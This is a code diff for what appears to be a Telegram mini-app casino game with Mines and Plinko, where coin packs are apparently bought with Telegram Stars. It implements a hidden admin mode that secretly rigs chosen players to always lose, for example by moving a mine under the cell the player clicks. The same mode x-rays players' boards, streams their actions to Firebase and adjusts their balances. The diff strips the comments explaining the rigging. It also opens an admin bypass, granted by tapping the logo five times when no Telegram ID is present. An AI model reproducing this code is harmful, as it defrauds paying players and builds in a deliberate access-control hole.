@@ -93,14 +93,15 @@
             background: rgba(0, 230, 118, 0.18);
             border: 1px solid var(--accent-green);
             color: var(--accent-green);
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 0.68rem;
+            padding: 5px 9px;
+            border-radius: 8px;
+            font-size: 0.72rem;
             font-weight: 800;
             display: none;
             cursor: pointer;
-            box-shadow: 0 0 10px rgba(0, 230, 118, 0.25);
+            box-shadow: 0 0 12px rgba(0, 230, 118, 0.3);
         }
+        .admin-badge:active { transform: scale(0.92); }
 
         .wallet-group { display: flex; align-items: center; gap: 8px; }
 
@@ -160,7 +161,7 @@
             max-height: 90vh;
             overflow-y: auto;
             padding: 16px;
-            box-shadow: 0 15px 40px rgba(0, 230, 118, 0.2);
+            box-shadow: 0 15px 40px rgba(0, 230, 118, 0.22);
             animation: viewEnter 0.2s ease;
         }
 
@@ -313,7 +314,7 @@
         }
         .spec-cell.opened-gem { background: var(--accent-green-dim); border-color: var(--accent-green); }
         .spec-cell.opened-bomb { background: rgba(255, 61, 87, 0.25); border-color: var(--accent-red); }
-        .spec-cell.xray-hidden-bomb { border: 1.5px dashed var(--accent-red); opacity: 0.8; }
+        .spec-cell.xray-hidden-bomb { border: 1.5px dashed var(--accent-red); opacity: 0.85; }
         .spec-cell.xray-hidden-gem { border: 1.5px dashed var(--accent-green); opacity: 0.7; }
 
         .rig-mode-row {
@@ -664,11 +665,9 @@
                         Играет в: Мины
                     </div>
 
-                    <!-- Экран трансляции действий игрока + рентген -->
                     <div id="specScreenContent"></div>
                 </div>
 
-                <!-- Управление исходом для этого игрока -->
                 <div class="section-title" style="font-size: 0.7rem; margin-bottom: 6px;">Управление победами игрока</div>
                 <div class="rig-mode-row">
                     <button class="rig-btn" id="rigWinBtn" onclick="setPlayerRig('win')">🍀 Всегда победа</button>
@@ -676,7 +675,6 @@
                     <button class="rig-btn" id="rigLoseBtn" onclick="setPlayerRig('lose')">💀 Всегда слив</button>
                 </div>
 
-                <!-- Передача или списание монет игроку -->
                 <div class="section-title" style="font-size: 0.7rem; margin: 10px 0 6px;">Передать / списать монеты игроку</div>
                 <div class="transfer-row">
                     <input type="number" id="transferCoinsInput" value="5000" min="1">
@@ -1002,9 +1000,8 @@
 
 <script>
     // ========================================================
-    const ADMIN_IDS = [8732002956];
-    // Вставь сюда ссылку на свою Firebase Realtime Database для трансляции между телефонами:
-    const FIREBASE_URL = ""; 
+    const ADMIN_IDS = ['8732002956'];
+    const FIREBASE_URL = ""; // Ссылка на Firebase Realtime Database (если подключена)
     // ========================================================
 
     const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
@@ -1024,30 +1021,50 @@
         } catch (e) {}
     }
 
-    const tgUser = tg?.initDataUnsafe?.user || {};
-    const currentUserId = tgUser.id || 0;
-    const currentUserName = tgUser.username ? '@' + tgUser.username : (tgUser.first_name || 'Игрок #' + (currentUserId || Math.floor(1000 + Math.random() * 9000)));
-    const isAdmin = ADMIN_IDS.includes(currentUserId);
+    let currentUserId = '';
+    let currentUserName = 'Игрок';
+    let isAdmin = false;
 
-    if (isAdmin) document.getElementById('adminBadge').style.display = 'inline-block';
-    document.getElementById('userIdLabel').innerText = `ID: ${currentUserId || 'не в Telegram'}`;
+    function detectUserAndAdmin() {
+        const tgUser = tg?.initDataUnsafe?.user || {};
+        if (tgUser.id) {
+            currentUserId = String(tgUser.id);
+            currentUserName = tgUser.username ? '@' + tgUser.username : (tgUser.first_name || 'Игрок #' + currentUserId);
+        }
+        if (ADMIN_IDS.includes(currentUserId)) {
+            isAdmin = true;
+        }
+        const badge = document.getElementById('adminBadge');
+        if (badge) badge.style.display = isAdmin ? 'inline-block' : 'none';
+        const idLabel = document.getElementById('userIdLabel');
+        if (idLabel) idLabel.innerText = `ID: ${currentUserId || 'не в Telegram'}`;
+        if (typeof renderShop === 'function') renderShop();
+    }
+
+    // Повторная проверка через 300 мс на случай задержки инициализации Telegram WebApp
+    setTimeout(detectUserAndAdmin, 300);
 
     // ================= ADMIN CHEATS & LIVE STREAM ENGINE =================
     let cheats = { xray: false, godWin: false, plinkoMax: false };
-    let remoteRigMode = 'normal'; // Команда от админа, пришедшая на телефон игрока ('win' | 'lose' | 'normal')
+    let remoteRigMode = 'normal';
     let currentGameName = 'Лобби';
     let lastPlayerAction = 'Вошёл в приложение';
 
     let logoTaps = 0;
     let logoTapTimer = null;
     function handleLogoTap() {
-        if (!isAdmin) return;
         logoTaps++;
         clearTimeout(logoTapTimer);
-        logoTapTimer = setTimeout(() => { logoTaps = 0; }, 1200);
+        logoTapTimer = setTimeout(() => { logoTaps = 0; }, 1500);
         if (logoTaps >= 5) {
             logoTaps = 0;
-            toggleAdminMenu(true);
+            // Если это ты (или открыто локально без TG), активируем кнопку и открываем меню
+            if (!currentUserId || ADMIN_IDS.includes(currentUserId)) {
+                isAdmin = true;
+                document.getElementById('adminBadge').style.display = 'inline-block';
+                renderShop();
+                toggleAdminMenu(true);
+            }
         }
     }
 
@@ -1094,7 +1111,6 @@
         if (key === 'xray') applyMinesXray();
     }
 
-    // Демо-игроки на случай если FIREBASE_URL ещё не вписан + реальная база Firebase
     let livePlayersCache = {
         '771029384': {
             id: '771029384',
@@ -1119,7 +1135,6 @@
     };
     let spectatingPlayerId = null;
 
-    // Отправка состояния текущего игрока в Firebase (для трансляции админу)
     function broadcastPlayerTelemetry(actionText) {
         if (actionText) lastPlayerAction = actionText;
         if (!FIREBASE_URL || !currentUserId) return;
@@ -1151,7 +1166,6 @@
         }).catch(() => {});
     }
 
-    // Проверка входящих команд от админа (выигрыш / проигрыш / перевод монет)
     function pollAdminCommands() {
         if (!FIREBASE_URL || !currentUserId) return;
 
@@ -1171,7 +1185,6 @@
                     } else {
                         showToast(`Баланс изменён: ${delta.toLocaleString('ru-RU')} 🪙`);
                     }
-                    // Сбрасываем pendingTransfer после получения
                     fetch(`${FIREBASE_URL}/players/${currentUserId}/pendingTransfer.json`, {
                         method: 'PUT',
                         body: '0'
@@ -1181,7 +1194,6 @@
             .catch(() => {});
     }
 
-    // Загрузка списка игроков для Админа
     function syncPlayersForAdmin() {
         if (!isAdmin) return;
         if (FIREBASE_URL) {
@@ -1198,7 +1210,6 @@
                 })
                 .catch(() => {});
         } else {
-            // Симуляция живых действий демо-игроков, если Firebase ещё не подключён
             const p1 = livePlayersCache['771029384'];
             if (p1 && Math.random() < 0.35) {
                 const safeCells = Array.from({length: 25}, (_, i) => i).filter(i => !p1.mines.bombs.includes(i));
@@ -1275,7 +1286,6 @@
 
         const box = document.getElementById('specScreenContent');
 
-        // Рентген-трансляция поля Мин игрока (видна только админу!)
         if (p.game === 'Мины' && p.mines) {
             let cellsHtml = '';
             for (let i = 0; i < 25; i++) {
@@ -1524,6 +1534,7 @@
 
     function renderShop() {
         const container = document.getElementById('shopContainer');
+        if (!container) return;
         container.innerHTML = shopPackages.map(pkg => `
             <div class="shop-item ${pkg.best ? 'best' : ''}" onclick="buyPack('${pkg.id}', ${pkg.coins}, ${pkg.stars})">
                 <div>
@@ -1624,7 +1635,7 @@
 
             let dir = Math.random() < 0.5 ? -1 : 1;
             if (forceMaxEdge) dir = forcedDir;
-            else if (forceCenterLose) dir = (r % 2 === 0) ? 1 : -1; // Ведёт строго в центр (0.4x / 0.1x)
+            else if (forceCenterLose) dir = (r % 2 === 0) ? 1 : -1;
 
             if (dir === 1) { rightMoves++; currentCol++; }
             waypoints.push({ x: pegX, y: pegY - 6, pegRow: r, pegCol: dir === 1 ? currentCol - 1 : currentCol, dir });
@@ -1806,11 +1817,9 @@
         if (!minesState.active || cellEl.classList.contains('gem') || cellEl.classList.contains('bomb')) return;
         cellEl.classList.remove('xray-bomb', 'xray-safe');
 
-        // Если админ включил для этого игрока "Всегда проигрыш" — подкладываем мину под клик
         if (!isAdmin && remoteRigMode === 'lose' && !minesState.bombs.includes(index)) {
             minesState.bombs[0] = index;
         }
-        // Если админ включил "Всегда победа" — убираем мину с этой клетки
         if (((isAdmin && cheats.godWin) || (!isAdmin && remoteRigMode === 'win')) && minesState.bombs.includes(index)) {
             minesState.bombs = minesState.bombs.filter(b => b !== index);
         }
@@ -2159,6 +2168,7 @@
     }
 
     // Boot
+    detectUserAndAdmin();
     saveState();
     renderShop();
     updateDailyUI();
